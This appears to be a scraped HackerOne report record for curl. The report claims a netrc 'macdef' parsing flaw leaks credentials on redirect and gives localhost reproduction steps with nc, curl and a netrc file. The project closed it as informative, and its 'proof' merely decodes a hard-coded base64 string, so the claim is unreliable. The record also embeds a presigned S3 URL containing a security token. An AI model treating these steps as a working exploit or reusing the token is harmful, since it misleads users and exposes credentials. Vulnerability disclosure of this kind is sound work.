@@ -1,0 +1,197 @@
+{
+  "id": 3211973,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjExOTcz",
+  "url": "https://hackerone.com/reports/3211973",
+  "title": "Credential leak on redirect due to improper state clearing when parsing macdef in netrc.c",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "low",
+  "readable_substate": "Informative",
+  "created_at": "2025-06-20T10:32:02.863Z",
+  "submitted_at": "2025-06-20T10:32:03.327Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "oxghostly",
+    "url": "/oxghostly",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2024-11053"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-22T16:26:30.068Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-06-22T10:56:09.374Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary : \n\n-When parsing a netrc. file, the macdef  keyword fails to clear previously loaded credentials. If a redirect follows, these credentials are leaked to the new \nhost. This is a new variant of CVE-2024-11053, triggered by a different code path ('macdef' instead of 'default').\n\n##No, this vulnerability was discovered through manual code analysis and testing\n\n## Affected version :\ncurl 8.15.0-DEV (x86_64-pc-linux-gnu) libcurl/8.15.0-DEV OpenSSL/3.5.0 zlib/1.3.1 libpsl/0.21.2\nRelease-Date: [unreleased]\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS Debug HSTS HTTPS-proxy IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP TrackMemory UnixSockets\n\n## Steps To Reproduce :\nSetup two listeners:\n1- nc -l -p 9000\n2-echo -e \"HTTP/1.1 301 Moved Permanently\\nLocation: http://localhost:9000\" | nc -l -p 8000 -q 1\n3-Create (poc_netrc.txt) file with the following content :\n-----------------------------------------------------\n\nmachine localhost\n  login admin\n  password SuperSecretPassword123\n\nmacdef foobar\necho \"malicious macro\"\n\ndefault\n  login not_admin\n\n------------------------------------------------------\n4-Execute curl to trigger the leak:\n ./src/curl -L --netrc-file poc_netrc.txt http://localhost:8000\n\n5-echo YWRtaW46U3VwZXJTZWNyZXRQYXNzd29yZDEyMw== > temp_output.txt\n6-base64 -d < temp_output.txt\n\n-result : admin:SuperSecretPassword123\n\n## Supporting Material/References\nThe output on the (Attacker Server) terminal (the one listening on port 9000) will show the leaked `Authorization` header containing the credentials for `localhost`. This proves that the credentials persisted across the redirect.\n\n## Impact\n\n##Impact:\nIf an attacker controls the redirect, they can trick curl into sending the victim’s .netrc username and password to the wrong server.\nThis can happen without the user noticing, especially in scripts or CI pipelines where curl runs automatically using .netrc for login.",
+  "weakness": {
+    "id": 113,
+    "name": "Information Exposure Through Sent Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4475472,
+      "file_name": "netrc-macdef-leak-poc.mkv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o98ix3q6ifzzftecuf53wbcuf5oq?response-content-disposition=attachment%3B%20filename%3D%22netrc-macdef-leak-poc.mkv%22%3B%20filename%2A%3DUTF-8%27%27netrc-macdef-leak-poc.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3OB3UFE5%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T043042Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIHCC4eyABQohB591sm46CI%2Fpm9SYrEoJ9jyfp57d5ppVAiEA2bgbDUXbtNfXGzV9V8AUdAMZlauaWG5bvuZXuuizIs4qsQUIBRADGgwwMTM2MTkyNzQ4NDkiDGPwkWKoYw8jK9I6DyqOBXbQc1CbTZRuRvTMhV9x1WRAjEdylqNAoR9hYS%2FTRjLHohdrfB3lBn6U0kb1jD0b6S5x%2B4eywDtCR7kJLDXtdsDqXtxgXZIP6huoVgpk008QC%2FFBaIrBChZ%2FPrKjEE96OwZ1ogE05JPHoScZdCKpDf9nynRShyDxH0oSH6nSEDJsT7bpL7Tt9Wm%2FQKjhWI%2B6iNeOyTG4GzdHCw2QLfpY8BvuZbM%2BdojiUOS2TRGCgnSmotfzPHx55tKlyzTLvV%2BNYims%2Fpporo%2FLwSEl%2FSKJwI72vnUPv%2FQIdFggvBDDdRpqtl7woOxM3IrqZlruScfZE%2FANHlavrr94BWsvvtTofKgySIIJVbVFEi5kP4PKI2qVjEARzAgc1PGMhEjMHXZeg%2BT%2BQI770VujP8RvwhyQtkxiP2SxgnwXGk7iaW%2FHzYECANbKQRJl4EZlEeknVNQZQ0o93NuR12OxxL9qLOj%2Fj6ylba7LrYseGRN3krER97aPqW9uuZWbIJFErClBZWKjNwy9PmxdPzVzpZzPSmgaE%2F2Ho6LAfQ3UaxYG7rnPhvUUwDeQFhkCpWElj3gUujUkhvhs1EbyXLMUgcYt2eOQ%2BQ2nqGnf7%2FmJGNJRBqWzyeHD%2BH8ZOJdvLgTY1e6RVKIVvPDe13RxPMTyDWbcqjW8gEajEOeGvaze8ENqZ02RKJNLkLdl7t6Ug%2Ffu1caTj7nMyl%2FwIXMVPyNDOvzfNhrqPEEq3zyr8l7Sv2RoFCbZZH6AURf%2FwyM8Xx7yYrsnPJmE12zxYQuRN%2Bc2ee2DHja7rbK5%2F8op0zEohcZQ8TFjL6JJ9xFn3kT3AGpdy3GfQzK2ck64yLZvDVv9Dvj5sSHoPfKcIGbvvGKXu9jbz4Df2jCE4pzSBjqxATZI8kIVr2Je%2Ff3JkWJxmZ54zDy8D9yXIeffqjRJ4Cz0JYR7nz5qNvo88pGUzJZzUFGdfC%2BO7oD%2BhRpqpAmv7wjqxSG3SO3I%2B6FHfgsdghUS6ngc2fi1S1vKSd2BRNuhdNAAUi26vdtRmezQsDFwsUUadmUN3OJMmcZIXY5edSIzOSghVcdtMrkapkBKNCw%2FXZmnz4wOjpIa18pxgubYOKLw2e9qzHlQv0RXI3FZn9ubNA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f3adfe9fcec2599406967cd6df3b05f261724b796b868b2ea8e552643f5e71e4",
+      "file_size": 21912350,
+      "type": "video/x-matroska",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 41,
+  "voters": [
+    "ryel",
+    "mohaned0101",
+    "thalaivar304",
+    "2026",
+    "the11gh0st",
+    "hkyevd0",
+    "0xsevil",
+    "pwny_sec1",
+    "alvin7l",
+    "m1ght-guy",
+    "and 31 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3211973",
+  "votes": 41,
+  "latest_disclosable_activity_at": "2025-06-22T16:26:29.927Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:30:43.007767",
+    "source": "https://hackerone.com/reports/3211973.json",
+    "report_id": 3211973
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjExOTcz",
+    "databaseId": "3211973",
+    "title": "Credential leak on redirect due to improper state clearing when parsing macdef in netrc.c",
+    "url": "https://hackerone.com/reports/3211973",
+    "state": null,
+    "substate": "informative",
+    "disclosed_at": "2025-06-22T16:26:30.068Z",
+    "created_at": "2025-06-20T10:32:02.863Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzExMw==",
+      "name": "Information Exposure Through Sent Data",
+      "external_id": "cwe-201"
+    },
+    "severity": {
+      "rating": "low",
+      "score": null
+    },
+    "reporter": {
+      "username": "oxghostly"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzMyMTE5NzM=",
+    "_id": "3211973",
+    "disclosed": true,
+    "votes": 41,
+    "latest_disclosable_activity_at": "2025-06-22T16:26:29.927Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjExOTcz",
+      "databaseId": "3211973",
+      "title": "Credential leak on redirect due to improper state clearing when parsing macdef in netrc.c",
+      "url": "https://hackerone.com/reports/3211973",
+      "disclosed_at": "2025-06-22T16:26:30.068Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzM1NjYz",
+      "handle": "curl",
+      "name": "curl",
+      "url": "https://hackerone.com/curl",
+      "currency": "usd"
+    }
+  }
+}
